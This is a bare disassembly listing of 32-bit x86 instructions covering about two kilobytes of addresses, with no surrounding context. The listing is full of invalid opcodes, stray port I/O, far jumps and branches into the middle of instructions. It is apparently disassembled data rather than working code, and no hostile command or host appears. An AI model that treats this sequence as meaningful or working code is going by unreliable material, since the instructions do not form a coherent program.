  410ef6:	sbb    eax,0x323fa28b
  410efb:	pop    edx
  410efc:	cwde   
  410efd:	pop    ebp
  410efe:	(bad)  
  410eff:	jge    0x410f06
  410f01:	pop    ebx
  410f02:	js     0x410e98
  410f04:	pop    ecx
  410f05:	int3   
  410f06:	faddp  st(2),st
  410f08:	mov    WORD PTR [edx+0x56a2d4c],ss
  410f0e:	mov    ch,0x96
  410f10:	inc    esi
  410f11:	xlat   BYTE PTR ds:[ebx]
  410f12:	push   edx
  410f13:	fcomip st,st(7)
  410f15:	add    DWORD PTR [esi-0x6402274f],0xffffffd4
  410f1c:	or     ebx,0x55
  410f1f:	mov    ch,0x87
  410f21:	stos   DWORD PTR es:[edi],eax
  410f22:	ret    
  410f23:	cmp    edx,esp
  410f25:	sbb    eax,0x569a3635
  410f2a:	jb     0x410f73
  410f2c:	in     eax,0xd6
  410f2e:	mov    bh,0x23
  410f30:	mov    ch,0x63
  410f32:	dec    edx
  410f33:	pop    edx
  410f34:	push   0x7abba67e
  410f39:	aaa    
  410f3a:	(bad)  
  410f3c:	(bad)  
  410f3d:	sbb    eax,0x768b0af7
  410f42:	xchg   edx,eax
  410f43:	push   edi
  410f44:	sahf   
  410f45:	mov    dl,0xbb
  410f47:	js     0x410f27
  410f49:	or     DWORD PTR [ebp+0x7],edx
  410f4c:	ret    
  410f4d:	in     al,dx
  410f4e:	dec    esp
  410f4f:	sbb    eax,0x285ce4d2
  410f54:	popa   
  410f55:	data16 jne 0x410f55
  410f58:	and    DWORD PTR [edx+0x5834fec8],eax
  410f5e:	mov    esp,DWORD PTR [edi]
  410f60:	mov    eax,0x7a4c8445
  410f65:	gs pop ebp
  410f67:	bound  esi,QWORD PTR [edx]
  410f69:	push   esp
  410f6a:	das    
  410f6b:	adc    DWORD PTR [edi],0xa9455cb9
  410f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f72:	es sti 
  410f74:	ja     0x410fea
  410f76:	rcr    DWORD PTR [esp+ebx*4-0x7a59a1d5],cl
  410f7d:	(bad)  
  410f7e:	jmp    0xd149:0x65d9e836
  410f85:	or     al,0x7d
  410f87:	stos   BYTE PTR es:[edi],al
  410f88:	inc    ecx
  410f89:	mov    al,ds:0xe294f6f6
  410f8e:	(bad)  
  410f8f:	cli    
  410f90:	out    dx,eax
  410f91:	dec    edx
  410f92:	dec    edx
  410f93:	fdivr  DWORD PTR [ecx+0x6fe3b64a]
  410f99:	add    BYTE PTR [eax-0x3baeb110],0xb1
  410fa0:	outs   dx,DWORD PTR ds:[esi]
  410fa1:	mov    esp,DWORD PTR [eax+0x6f]
  410fa4:	sbb    al,0x99
  410fa6:	pop    edx
  410fa7:	bound  edx,QWORD PTR [ebx]
  410fa9:	pop    ss
  410faa:	enter  0x108b,0xc0
  410fae:	add    ah,BYTE PTR [ecx]
  410fb0:	dec    eax
  410fb1:	test   BYTE PTR [ebx],ch
  410fb3:	mov    dl,0x72
  410fb6:	clc    
  410fb7:	inc    ecx
  410fb8:	(bad)  
  410fb9:	mov    al,0x37
  410fbb:	dec    esp
  410fbc:	push   0x28d0ea39
  410fc1:	pop    edx
  410fc2:	xor    ebx,0xcf3e1eb
  410fc8:	out    0xe,al
  410fca:	(bad)  [ebx+0x3b]
  410fcd:	adc    edi,edi
  410fcf:	fiadd  WORD PTR [edx-0x191520fb]
  410fd5:	push   ds
  410fd6:	or     al,0x50
  410fd8:	shr    BYTE PTR [esi],0xfb
  410fdb:	jg     0x411010
  410fdd:	out    0x66,al
  410fdf:	jg     0x410f75
  410fe1:	xlat   BYTE PTR ds:[ebx]
  410fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fe3:	push   ds
  410fe4:	stc    
  410fe5:	ficom  WORD PTR [ecx]
  410fe7:	xchg   ecx,eax
  410fe8:	or     eax,0xce6464e1
  410fed:	lods   al,BYTE PTR ds:[esi]
  410fee:	xchg   DWORD PTR [ebx],esp
  410ff0:	movmskps ecx,xmm4
  410ff3:	cmp    DWORD PTR [ebx+edx*4-0x55b3b9f9],0x7589c73c
  410ffe:	fiadd  WORD PTR [eax+esi*2+0x6c]
  411002:	sar    BYTE PTR [eax-0xa],cl
  411005:	sbb    al,bl
  411007:	loopne 0x410fa8
  411009:	das    
  41100a:	mov    eax,0xd8a86f54
  41100f:	xchg   BYTE PTR [ebx+eiz*8+0xeae97c9],ah
  411016:	mov    al,ds:0xf50d6bba
  41101b:	mov    al,ds:0xc321ab19
  411020:	fmulp  st(0),st
  411022:	sbb    DWORD PTR [eax+edi*2-0x4b],ecx
  411026:	rcr    DWORD PTR [ecx+0x22],1
  411029:	pop    ebp
  41102a:	pop    edi
  41102b:	popa   
  41102c:	sub    cl,bh
  41102e:	mov    al,0xc4
  411030:	mov    eax,0xe124784f
  411035:	rcl    BYTE PTR [edi-0x1a025006],cl
  41103b:	into   
  41103c:	mov    edi,0x65a7a93
  411041:	fldcw  WORD PTR [edi-0x15]
  411044:	and    edx,DWORD PTR [ecx-0x6d]
  411047:	dec    edi
  411048:	shr    BYTE PTR [ebx+0x2af8ad15],1
  41104e:	mov    esi,0xbf340896
  411053:	jmp    0xd095f463
  411058:	pop    ds
  411059:	icebp  
  41105a:	add    dl,bh
  41105c:	adc    cl,BYTE PTR [ebp+ebp*4+0x24a93d62]
  411063:	xor    DWORD PTR [esi-0x17],ebp
  411066:	mov    ?,WORD PTR [esi-0x79ce7263]
  41106c:	aas    
  41106d:	cs mov edx,0x78746d05
  411073:	dec    ecx
  411074:	fwait
  411075:	pop    esi
  411076:	loopne 0x4110ba
  411078:	mov    ds:0x89db819e,al
  41107d:	xor    BYTE PTR [ebx-0x5],ch
  411080:	jmp    0x1bf6:0x59e21cd1
  411087:	retf   
  411088:	add    ax,0xcc24
  41108c:	cmp    eax,0x562adaa
  411091:	xor    al,0x2d
  411093:	sub    eax,0x2bb151ec
  411098:	retf   
  411099:	fucomi st,st(0)
  41109b:	jecxz  0x411023
  41109d:	aas    
  41109e:	jns    0x4110b0
  4110a0:	xchg   edi,eax
  4110a1:	dec    esi
  4110a2:	jb     0x4110f2
  4110a4:	clc    
  4110a5:	inc    edi
  4110a6:	push   edx
  4110a7:	pop    edx
  4110a8:	sub    esi,ecx
  4110aa:	mov    ch,0x92
  4110ac:	sahf   
  4110ad:	enter  0x3e4d,0xe3
  4110b1:	std    
  4110b2:	fld    DWORD PTR [esi-0x525eac51]
  4110b8:	popa   
  4110b9:	stos   DWORD PTR es:[edi],eax
  4110ba:	xchg   edx,eax
  4110bb:	mov    DWORD PTR [edx-0x1c],edi
  4110be:	inc    esi
  4110bf:	mov    BYTE PTR [ebp+eax*2-0x27],ah
  4110c3:	or     DWORD PTR [ebp+0x77],esi
  4110c6:	pop    eax
  4110c7:	jno    0x411084
  4110c9:	popf   
  4110ca:	daa    
  4110cb:	add    BYTE PTR [ebp+0x1cff07e4],ah
  4110d1:	fdiv   QWORD PTR [esp+edi*2+0x6ec1d1a7]
  4110d8:	pop    edx
  4110d9:	loopne 0x4110b9
  4110db:	jge    0x41112a
  4110dd:	mov    ds:0x966b26bc,eax
  4110e2:	add    dl,BYTE PTR [esi+0x30]
  4110e5:	pop    esp
  4110e6:	cmp    ah,BYTE PTR [esi+0x4f]
  4110e9:	test   DWORD PTR [eax+edi*2-0x3],ecx
  4110ed:	out    0x6c,eax
  4110ef:	fild   DWORD PTR [ebx+esi*1-0x2d]
  4110f3:	sbb    edx,DWORD PTR [edi]
  4110f5:	sbb    BYTE PTR [edi+0x7a],ah
  4110f8:	jns    0x411087
  4110fa:	xchg   esi,edi
  4110fc:	cmp    BYTE PTR [ecx+0x72],ch
  4110ff:	push   ebp
  411100:	imul   esi,ecx,0x9
  411103:	inc    eax
  411104:	mov    dl,0x7e
  411106:	and    al,0x1c
  411108:	inc    ebp
  411109:	dec    edi
  41110a:	jne    0x411133
  41110c:	xchg   BYTE PTR [eax-0x2a2b1c6e],bh
  411112:	lods   al,BYTE PTR ds:[esi]
  411113:	add    BYTE PTR [edi],0x2e
  411116:	mov    dh,0x3d
  411118:	sbb    BYTE PTR [ebp-0x3e],ch
  41111b:	jmp    0x74b9:0xe516abed
  411122:	cmc    
  411123:	cmp    al,0xdb
  411125:	sub    al,0x6a
  411127:	daa    
  411128:	scas   al,BYTE PTR es:[edi]
  411129:	lods   al,BYTE PTR ds:[esi]
  41112a:	add    dh,bh
  41112c:	or     edi,esi
  41112e:	sahf   
  41112f:	inc    BYTE PTR [eax+ebp*1]
  411132:	aam    0x10
  411134:	bound  dx,DWORD PTR [ebp-0x48245071]
  41113b:	xchg   edi,eax
  41113c:	fidiv  WORD PTR ds:0xed7cf35f
  411142:	and    ch,bl
  411144:	dec    esi
  411145:	fistp  DWORD PTR [eax+ebx*8+0x3923e933]
  41114c:	fwait
  41114d:	xor    al,0xa8
  41114f:	mov    ch,0xd9
  411151:	psubd  mm5,mm3
  411154:	retf   
  411155:	push   eax
  411156:	fistp  WORD PTR [ebp+edx*1-0x78ee1288]
  41115d:	mov    edi,DWORD PTR [esi+0x35]
  411160:	mov    eax,0xe93bdeaa
  411165:	(bad)  
  411166:	iret   
  411167:	lea    edx,[edx+0x35]
  41116a:	or     BYTE PTR [edi+ebx*2+0x6f],0x3f
  41116f:	dec    edi
  411170:	push   0xffffffb6
  411172:	or     eax,0x8b670579
  411177:	loop   0x411169
  411179:	bound  esp,QWORD PTR [edx]
  41117b:	(bad)  
  41117c:	pushf  
  41117d:	mov    al,0x3b
  41117f:	xchg   esp,eax
  411180:	or     eax,0xcfecaa39
  411185:	leave  
  411186:	imul   esi,DWORD PTR [eax+0x46],0xfffffffe
  41118a:	gs ja  0x411136
  41118d:	mov    eax,ds:0x863d5647
  411192:	jmp    DWORD PTR [edx-0x7c]
  411195:	cmc    
  411196:	inc    ebp
  411197:	cli    
  411198:	dec    esp
  411199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41119a:	push   ss
  41119b:	scas   eax,DWORD PTR es:[edi]
  41119c:	sub    al,0x23
  41119f:	mov    ss,WORD PTR [edi]
  4111a1:	add    BYTE PTR ds:[edi-0x41e1e27f],0x10
  4111a9:	test   eax,0x3e1110f1
  4111ae:	enter  0xeafc,0x3e
  4111b2:	xchg   ebp,eax
  4111b3:	call   0x2de0964
  4111b8:	clc    
  4111b9:	mov    ch,0x57
  4111bb:	mov    ds:0xaaeccd04,eax
  4111c0:	ret    
  4111c1:	ja     0x411195
  4111c3:	pop    edi
  4111c4:	test   DWORD PTR [edx],esi
  4111c6:	jmp    0x41123c
  4111c8:	pushf  
  4111c9:	mov    ebx,0xf1e00ad0
  4111ce:	sbb    edx,DWORD PTR [esi-0x32]
  4111d1:	outs   dx,BYTE PTR ds:[esi]
  4111d2:	xchg   ecx,eax
  4111d3:	push   ebp
  4111d4:	push   ebp
  4111d5:	push   ds
  4111d6:	into   
  4111d7:	push   ebx
  4111d8:	jo     0x4111b2
  4111da:	or     al,0x94
  4111dc:	add    eax,0x2be1a427
  4111e1:	das    
  4111e2:	fst    QWORD PTR [edx+edi*2-0x2ae458b5]
  4111e9:	mov    eax,0xe9df6f4b
  4111ee:	aam    0xf
  4111f0:	repz sbb ch,al
  4111f3:	sub    DWORD PTR [ebx+0x4],0xffffff92
  4111f7:	jg     0x411213
  4111f9:	jmp    0x8aa9:0x251793ec
  411200:	out    dx,al
  411201:	pop    edi
  411202:	pop    eax
  411203:	and    bl,BYTE PTR [ecx]
  411205:	cwde   
  411206:	xor    al,0x3e
  411208:	cs stos BYTE PTR es:[edi],al
  41120a:	or     DWORD PTR [ecx+eax*4+0x6ce8930e],esp
  411211:	out    dx,al
  411212:	jae    0x411198
  411214:	(bad)  
  411216:	fbstp  TBYTE PTR [ecx]
  411218:	adc    eax,0xb8237050
  41121d:	idiv   BYTE PTR gs:[eax]
  411220:	outs   dx,BYTE PTR ds:[esi]
  411221:	adc    BYTE PTR [ebx],al
  411223:	jb     0x411235
  411225:	iret   
  411226:	aaa    
  411227:	sahf   
  411228:	jo     0x41124e
  41122a:	icebp  
  41122b:	cmp    esp,DWORD PTR [edx*1-0x6d55f8d6]
  411232:	pop    ebp
  411233:	bnd ja 0x411271
  411236:	(bad)  
  411237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411238:	add    BYTE PTR [edi+0x55bff57e],bl
  41123e:	rcl    DWORD PTR [esi],1
  411240:	sbb    eax,ecx
  411242:	add    al,0xb7
  411244:	adc    dl,bh
  411246:	sbb    edx,DWORD PTR [ebx-0x53]
  411249:	je     0x411223
  41124b:	xor    ah,ch
  41124d:	es aam 0x30
  411250:	test   BYTE PTR [ecx+0x1192c013],ah
  411256:	pushf  
  411257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411258:	sub    edi,DWORD PTR [ebp-0x3df32607]
  41125e:	ror    BYTE PTR [eax],cl
  411260:	aam    0xd4
  411262:	mov    al,ds:0xfcc5ee3c
  411267:	adc    al,BYTE PTR [edi]
  411269:	je     0x411217
  41126b:	inc    edi
  41126c:	loopne 0x4112cf
  41126e:	div    ebx
  411270:	push   es
  411271:	xchg   esp,eax
  411272:	xchg   ebp,eax
  411273:	mov    edx,0xdecf9d0a
  411278:	inc    ebp
  411279:	mov    BYTE PTR [eax],bl
  41127b:	mov    dh,0x9c
  41127d:	push   ss
  41127e:	mov    ch,0xab
  411280:	ins    BYTE PTR es:[edi],dx
  411281:	nop
  411282:	mov    ?,WORD PTR [edi-0x25]
  411285:	jno    0x41125f
  411287:	popa   
  411288:	clc    
  411289:	ja     0x41124b
  41128b:	mov    esi,0xa5e9edd3
  411290:	and    BYTE PTR [ecx+0x70],dh
  411293:	push   esi
  411294:	inc    esp
  411295:	mov    ?,WORD PTR [edi+0x629613b7]
  41129b:	add    eax,0x2faab1f8
  4112a0:	scas   eax,DWORD PTR es:[edi]
  4112a1:	push   cs
  4112a2:	and    ebp,DWORD PTR [ebx+0x59011f28]
  4112a8:	mov    gs,ecx
  4112aa:	aam    0x69
  4112ac:	and    eax,0x26ae9fbe
  4112b1:	inc    eax
  4112b2:	fcomp  DWORD PTR [esi+0x466c23ef]
  4112b8:	inc    edx
  4112b9:	aad    0x5f
  4112bb:	xchg   cl,dl
  4112bd:	mov    ah,0x2a
  4112bf:	push   ecx
  4112c0:	sub    ch,BYTE PTR [edx-0x11]
  4112c3:	mov    gs,WORD PTR [ecx]
  4112c5:	add    DWORD PTR ds:0xd4067959,0xfffffffe
  4112cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112cd:	ins    BYTE PTR es:[edi],dx
  4112ce:	pop    esp
  4112cf:	mov    ebp,0x276b371c
  4112d4:	fs sub al,0xaf
  4112d7:	sbb    BYTE PTR [edx-0xc],ah
  4112da:	cmp    BYTE PTR [esi-0x17],dh
  4112dd:	gs dec ebp
  4112df:	pop    esp
  4112e0:	mov    BYTE PTR [esi],cl
  4112e2:	js     0x41134d
  4112e4:	mov    edx,DWORD PTR [esi-0x6c68ba43]
  4112ea:	xchg   ebp,eax
  4112eb:	cli    
  4112ec:	xor    al,0xc0
  4112ee:	(bad)  
  4112f1:	into   
  4112f2:	test   BYTE PTR [eax],al
  4112f4:	jmp    0x411278
  4112f6:	mov    bl,0x8
  4112f8:	fsub   DWORD PTR [edi+0x64]
  4112fb:	adc    DWORD PTR [ecx+0x4fa139c3],0x58361369
  411305:	dec    esp
  411306:	loope  0x411289
  411308:	outs   dx,DWORD PTR ds:[esi]
  411309:	test   DWORD PTR ss:[edi-0x50],esi
  41130d:	frstor [eax]
  41130f:	ins    BYTE PTR es:[edi],dx
  411310:	add    ebx,DWORD PTR [ebx-0x8]
  411313:	cmp    al,0xc7
  411315:	mov    BYTE PTR [ebp-0x4d],ch
  411318:	into   
  411319:	in     eax,dx
  41131a:	iret   
  41131b:	mov    bl,0xa0
  41131d:	fst    DWORD PTR [ebx+edx*1]
  411320:	rcl    esi,1
  411322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411323:	scas   al,BYTE PTR es:[edi]
  411324:	sar    BYTE PTR [edi-0x403796cb],0x29
  41132b:	stc    
  41132c:	pusha  
  41132d:	add    BYTE PTR [ebx-0x65b76649],cl
  411333:	int    0xb1
  411335:	jle    0x411352
  411337:	sti    
  411338:	pop    edi
  411339:	cmp    cl,BYTE PTR [edi]
  41133b:	mov    ecx,0xc0670f08
  411340:	rol    cl,cl
  411342:	mov    bl,0xff
  411344:	and    eax,0x77de9880
  411349:	sbb    edi,DWORD PTR [edi-0x51c3f582]
  41134f:	xchg   esi,eax
  411350:	icebp  
  411351:	push   0xffffff98
  411353:	loopne 0x41137d
  411355:	sahf   
  411356:	in     eax,0x61
  411358:	cwde   
  411359:	arpl   WORD PTR [esp+edi*2+0x12],di
  41135d:	sub    al,0xd7
  41135f:	ss das 
  411361:	jmp    0xdd9:0x566c97a8
  411368:	push   eax
  411369:	fsub   DWORD PTR [ecx]
  41136b:	sar    BYTE PTR [ecx+0x2f],cl
  41136e:	push   0x36685b5a
  411373:	fisttp WORD PTR [ecx-0x20f75a73]
  411379:	aaa    
  41137a:	pop    ebp
  41137b:	pushf  
  41137c:	pop    ebx
  41137d:	pop    ebx
  41137e:	push   esi
  41137f:	adc    bh,al
  411381:	dec    esp
  411382:	cmp    esi,esi
  411384:	(bad)  
  411385:	mov    edi,0xfdf465d
  41138a:	sbb    DWORD PTR [eax],esi
  41138c:	in     eax,dx
  41138d:	push   eax
  41138e:	push   ecx
  41138f:	aam    0x20
  411391:	dec    esi
  411392:	sub    al,0xb0
  411394:	lods   eax,DWORD PTR ds:[esi]
  411395:	aad    0xd5
  411397:	(bad)  
  411398:	aam    0x7b
  41139a:	sbb    eax,0x137ce608
  41139f:	inc    ebp
  4113a0:	in     eax,dx
  4113a1:	inc    esp
  4113a2:	outs   dx,DWORD PTR ds:[esi]
  4113a3:	imul   esi,DWORD PTR [ebx],0xb51d9564
  4113a9:	(bad)  
  4113aa:	push   ds
  4113ab:	addr16 mov edx,0xa20009e7
  4113b1:	mov    ds,WORD PTR gs:[eax]
  4113b4:	in     al,dx
  4113b5:	jmp    0x194e1634
  4113ba:	sar    DWORD PTR [esi+0x12178cd6],1
  4113c0:	daa    
  4113c1:	xor    ch,bl
  4113c3:	xchg   edi,eax
  4113c4:	jmp    0x411417
  4113c6:	ja     0x411381
  4113c8:	dec    ebx
  4113c9:	loopne 0x411363
  4113cb:	cld    
  4113cc:	iret   
  4113cd:	mov    bh,0xa
  4113cf:	or     eax,0xe8dc1224
  4113d4:	mov    ebp,0x4c982e53
  4113d9:	inc    ecx
  4113da:	stc    
  4113db:	call   0xb275:0xa0a4ab6b
  4113e2:	cwde   
  4113e3:	jl     0x41136f
  4113e5:	test   eax,0xc3a641f3
  4113ea:	add    ebx,DWORD PTR [ebx-0x2b]
  4113ed:	out    0x5e,al
  4113ef:	les    edi,FWORD PTR [ebp+0x3d]
  4113f2:	xchg   esp,eax
  4113f3:	add    esi,ebp
  4113f5:	fsub   DWORD PTR [esi]
  4113f7:	jb     0x41144e
  4113f9:	ret    0xf8a3
  4113fc:	imul   esp,DWORD PTR [ebx-0x5bc841d0],0x10
  411403:	pop    ecx
  411404:	loop   0x4113ad
  411406:	sti    
  411407:	sahf   
  411408:	inc    ebp
  411409:	addr16 mov ebp,0xd5df1fdf
  41140f:	pusha  
  411410:	xor    BYTE PTR [ecx+0x10],bh
  411413:	inc    ecx
  411414:	jecxz  0x41140a
  411416:	out    dx,al
  411417:	mov    BYTE PTR [ebx-0x56c0aa40],al
  41141d:	mov    eax,0xfa3fce3a
  411422:	call   0x708399af
  411427:	mov    bl,0x24
  411429:	add    ebx,edx
  41142b:	jb     0x411404
  41142d:	imul   esi,DWORD PTR [edx-0x42094c3],0xfffffff1
  411434:	mov    ebp,0x6f6629dc
  411439:	addr16 dec edi
  41143b:	scas   al,BYTE PTR es:[edi]
  41143c:	cmp    ecx,DWORD PTR [edx]
  41143e:	aaa    
  41143f:	or     esp,DWORD PTR ds:[esi+esi*4]
  411443:	bound  ebx,QWORD PTR cs:[esi-0x4030bc5b]
  41144a:	(bad)  
  41144b:	xchg   ebp,eax
  41144c:	push   ax
  41144e:	(bad)  
  41144f:	out    dx,eax
  411450:	rcr    BYTE PTR [ecx],cl
  411452:	xchg   BYTE PTR ds:0xfedb466a,dh
  411458:	mov    dl,0xfd
  41145a:	adc    BYTE PTR [ecx-0x66eeb4c0],cl
  411460:	(bad)  
  411461:	jmp    0x4113e9
  411463:	idiv   DWORD PTR [esi+0x4e]
  411466:	out    dx,al
  411467:	les    eax,FWORD PTR [ecx]
  411469:	cmp    DWORD PTR [ecx],esp
  41146b:	ret    0x4fcd
  41146e:	mov    dl,0x86
  411470:	ja     0x41140b
  411472:	sahf   
  411473:	xchg   edi,eax
  411474:	call   0xa8f222a1
  411479:	aad    0x91
  41147b:	fcomip st,st(0)
  41147d:	ds add DWORD PTR gs:[esi+ecx*4-0x30],ebx
  411483:	jmp    0xca72ede8
  411488:	pop    esi
  411489:	mov    cl,0xc5
  41148b:	loope  0x4114a9
  41148d:	dec    ecx
  41148e:	mov    cs,WORD PTR ds:0x21922ccd
  411494:	dec    ecx
  411495:	imul   DWORD PTR [edi]
  411497:	fadd   st(6),st
  411499:	sbb    eax,0x887d91f9
  41149e:	mov    edx,0x886fe94b
  4114a3:	arpl   WORD PTR [eax],bx
  4114a5:	xchg   edx,eax
  4114a6:	mov    esp,0x82fa6b6d
  4114ab:	mov    ebx,0x2c964257
  4114b0:	mov    edx,0xfb497eed
  4114b5:	leave  
  4114b6:	aaa    
  4114b7:	jmp    0x411458
  4114b9:	mov    dl,0xcb
  4114bb:	cdq    
  4114bc:	cmp    eax,0x3ab4fc84
  4114c1:	sar    DWORD PTR [edi],0xa0
  4114c4:	not    DWORD PTR [ecx+0x6d25e671]
  4114ca:	das    
  4114cb:	leave  
  4114cc:	test   eax,0x887ea914
  4114d1:	or     DWORD PTR [ecx-0x21],eax
  4114d4:	(bad)  
  4114d5:	jno    0x4114fe
  4114d7:	pop    DWORD PTR [ecx]
  4114d9:	sbb    bh,BYTE PTR [esi+0x17]
  4114dc:	ret    
  4114dd:	aad    0x60
  4114df:	cdq    
  4114e0:	xchg   ebx,eax
  4114e1:	mov    edi,0xc041c596
  4114e6:	push   0x4a
  4114e8:	sbb    esi,ecx
  4114ea:	shl    BYTE PTR [eax-0x4f8519e4],cl
  4114f0:	pusha  
  4114f1:	imul   esi,edi,0x34eb1d13
  4114f7:	lock (bad) 
  4114fa:	mov    al,0xd8
  4114fc:	sbb    dl,ch
  4114fe:	mov    al,ds:0x65c74b4
  411503:	out    0xac,al
  411505:	jmp    0xde680775
  41150a:	jmp    0x41148e
  41150c:	push   esp
  41150d:	sbb    DWORD PTR [eax+0x7df49245],ebp
  411513:	repz xor dl,BYTE PTR [edx]
  411516:	add    bl,bh
  411518:	push   ds
  411519:	call   0x8587:0x3aa66be6
  411520:	dec    ecx
  411521:	add    DWORD PTR [ecx+0x3799257e],eax
  411527:	les    edi,FWORD PTR [eax+0x6db31ef4]
  41152d:	push   eax
  41152e:	mov    eax,DWORD PTR [edx-0x54]
  411531:	sub    dh,BYTE PTR [eax-0x1b]
  411534:	and    al,0x3e
  411536:	sub    DWORD PTR [eax],esp
  411538:	sbb    DWORD PTR [ecx+0x49a08337],ebx
  41153e:	mov    al,0xa3
  411540:	and    BYTE PTR [edi-0x8f543b0],0xe2
  411547:	and    al,0xa2
  411549:	cmovnp ebp,DWORD PTR [ebx]
  41154c:	fwait
  41154d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41154e:	push   ebx
  41154f:	add    DWORD PTR [esi+0x1e1566ac],ecx
  411555:	push   0xc71e9bae
  41155a:	xchg   BYTE PTR [eax],dl
  41155c:	test   eax,0x564b7fe0
  411561:	push   eax
  411562:	lods   al,BYTE PTR ds:[esi]
  411563:	mov    ds:0xe2c67a02,ax
  411569:	mov    WORD PTR [ebx-0xfdf2ef],fs
  41156f:	mov    al,ds:0x65e85ac8
  411574:	lock cmp dh,BYTE PTR [ebx+0x1e]
  411578:	lock xchg edx,eax
  41157a:	int3   
  41157b:	(bad)  
  41157c:	in     al,dx
  41157d:	lock pop edi
  41157f:	and    BYTE PTR ds:0xb0f5ad62,0xd2
  411586:	nop
  411587:	xchg   edx,eax
  411588:	fimul  DWORD PTR [ebx+0x78de2a7b]
  41158e:	xchg   esi,eax
  41158f:	pop    ebp
  411590:	and    esi,esi
  411592:	test   BYTE PTR [ebx+0x36bcaf2c],dl
  411598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411599:	jo     0x411548
  41159b:	push   ds
  41159c:	xchg   ah,bl
  41159e:	push   ebx
  41159f:	loopne 0x411533
  4115a1:	or     bh,BYTE PTR [esi-0x3a]
  4115a4:	imul   ecx,ebp,0xffffff81
  4115a7:	or     al,0xe8
  4115a9:	in     al,0xb0
  4115ab:	int    0xa2
  4115ad:	cwde   
  4115ae:	sbb    al,0x3f
  4115b0:	in     al,0xf1
  4115b2:	lods   al,BYTE PTR ds:[esi]
  4115b3:	jne    0x4115c3
  4115b5:	arpl   WORD PTR [edi],ax
  4115b7:	ficomp WORD PTR [esi]
  4115b9:	dec    eax
  4115ba:	ins    BYTE PTR es:[edi],dx
  4115bb:	mov    edi,0xe552666d
  4115c0:	mov    bl,0x24
  4115c2:	jmp    0x2763:0x5140a78a
  4115c9:	add    ecx,eax
  4115cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115cc:	sbb    DWORD PTR [esi-0x1c5f2e70],ecx
  4115d2:	push   eax
  4115d3:	xchg   BYTE PTR [esi+0x5f129608],ah
  4115d9:	or     ah,BYTE PTR ds:0xd2673899
  4115df:	pop    ss
  4115e0:	dec    ebx
  4115e1:	clc    
  4115e2:	sub    ah,bl
  4115e4:	add    eax,0xf0709c6e
  4115e9:	inc    esi
  4115ea:	mov    ebp,0x72129aca
  4115ef:	and    eax,0x659ee063
  4115f4:	cmp    DWORD PTR [esi],esi
  4115f6:	sbb    edi,ebx
  4115f8:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115fa:	outs   dx,BYTE PTR ds:[esi]
  4115fb:	push   es
  4115fc:	dec    edi
  4115fd:	adc    eax,DWORD PTR [edi]
  4115ff:	mov    ebp,0xa8f2d18f
  411604:	in     al,0x8d
  411606:	push   ebx
  411607:	jp     0x41159b
  411609:	adc    eax,0x2ff86114
  41160e:	int3   
  41160f:	cmp    BYTE PTR [esi+edx*4+0x1f],dh
  411613:	sbb    DWORD PTR [esi],esp
  411615:	xchg   esp,eax
  411616:	rcr    BYTE PTR [ebx],0xd2
  411619:	scas   al,BYTE PTR es:[edi]
  41161a:	jecxz  0x41160f
  41161c:	jno    0x41164e
  41161e:	lock jmp 0x9aed:0x79751858
  411626:	loope  0x4115e2
  411628:	daa    
  411629:	in     eax,0x54
  41162b:	cmp    dh,BYTE PTR [edx-0x338948fd]
  411631:	push   ebp
  411632:	mov    BYTE PTR [eax+ebx*2-0x32682685],ch
  411639:	or     DWORD PTR [ebx+0x7],ebp
  41163c:	or     cl,BYTE PTR ds:0x7165c899
  411642:	in     eax,dx
  411643:	mov    al,ds:0xdf3e01d4
  411648:	sub    ah,BYTE PTR [eax+0x1e]
  41164b:	or     esp,DWORD PTR [eax-0x59cefbef]
  411651:	xchg   esp,eax
  411652:	pusha  
  411653:	and    esp,DWORD PTR [ecx-0x76]
  411656:	xor    eax,0xb300d109
  41165b:	and    al,0x53
  41165d:	fisttp QWORD PTR [edi]
  41165f:	xchg   BYTE PTR [esi-0x690891f4],bl
  411665:	cmp    al,0xff
  411667:	shl    BYTE PTR [ebx-0x2b],1
  41166a:	inc    ebx
  41166b:	add    edx,DWORD PTR [eax-0x70]
  41166e:	pushf  
  41166f:	xchg   esi,eax
  411670:	jno    0x411675
  411672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411673:	dec    edi
  411674:	mov    bl,0x4a
  411676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411677:	lods   eax,DWORD PTR ds:[esi]
  411678:	jae    0x41169b
  41167a:	lods   eax,DWORD PTR ds:[esi]
  41167b:	out    dx,eax
  41167c:	or     cl,BYTE PTR [edi]
  41167e:	xor    eax,0x1b6a9157
  411683:	sub    eax,0xee5a0765
  411688:	adc    eax,0x79e48e9a
  41168d:	xor    al,0x17
  41168f:	push   edx
  411690:	stc    
  411691:	sbb    ebx,DWORD PTR [eax+0x1fdada1b]
  411697:	sbb    al,0x4c
  411699:	or     BYTE PTR [esi+0x293c11e7],al
  41169f:	pushf  
  4116a0:	inc    ecx
  4116a1:	ds leave 
  4116a3:	or     eax,0xb32606a0
  4116a8:	fistp  DWORD PTR [esi]
  4116aa:	mov    al,ds:0x10f62c9
  4116af:	xor    edi,DWORD PTR [ebx-0x44e6d614]
  4116b5:	and    bh,BYTE PTR [esi+0x411707ea]
  4116bb:	out    dx,eax
  4116bc:	(bad)
  4116c1:	lds    ebp,FWORD PTR [edx+0x38fefa0e]
  4116c7:	sub    al,0xac
  4116c9:	out    dx,al
  4116ca:	jmp    0xa16b:0x27c6872d
  4116d1:	pop    es
  4116d2:	into   
  4116d3:	jmp    0x411661
  4116d5:	ror    BYTE PTR [edx-0x4cc1ba86],0xfe
  4116dc:	sub    BYTE PTR [eax+0x6f57bded],dh
  4116e2:	(bad)  
  4116e3:	mov    edi,esi
  4116e5:	and    al,0xa6
  4116e7:	sub    al,0xed
  4116e9:	aas    
  4116ea:	mov    ebx,0x203c8bed
  4116ef:	adc    bh,ch
  4116f1:	xchg   edx,eax
